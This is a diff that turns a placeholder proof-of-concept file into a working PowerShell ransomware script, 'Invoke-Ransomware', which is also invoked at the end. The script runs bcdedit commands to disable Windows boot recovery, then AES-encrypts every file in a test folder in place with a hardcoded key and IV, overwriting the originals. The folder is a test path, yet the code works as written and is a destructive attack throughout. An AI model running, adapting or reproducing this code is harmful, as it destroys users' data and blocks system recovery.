@@ -1,2 +1,33 @@
-# Test
-this is a test for POC
+ function Invoke-Ransomware 
+{
+    $drives = "C:\Users\Public\Test"
+
+    # Disable recovery options
+    # Disable Startup Repair from trying to start when a problem is detected
+    bcdedit /set recoveryenabled No | Out-Null
+    # Disable Windows recovery at startup
+    bcdedit /set bootstatuspolicy ignoreallfailures | Out-Null
+
+
+    $IV = 'RvQUR/CILm1UiQN/u+BABA=='
+    $Key = 'lvk3AlqoxLFbKjHXTuHs500WEM7Y+6zAX1Y/F7kD+5U='
+
+    $aesManaged = new-object "System.Security.Cryptography.AesManaged"
+    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+    $aesManaged.BlockSize = 128
+    $aesManaged.KeySize = 256
+    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
+    $aesManaged.Key = [System.Convert]::FromBase64String($Key)
+    $encryptor = $aesManaged.CreateEncryptor()
+    $files = Get-ChildItem $drives
+    foreach($file in $files) 
+        {
+            Write-Host $files
+            $bytes=[System.IO.File]::ReadAllBytes($($file.FullName))
+            $encryptedData=$encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
+            [byte[]] $fullData=$aesManaged.IV + $encryptedData
+            [System.IO.File]::WriteAllBytes($($file.FullName),$fullData)        
+        }
+}
+Invoke-Ransomware
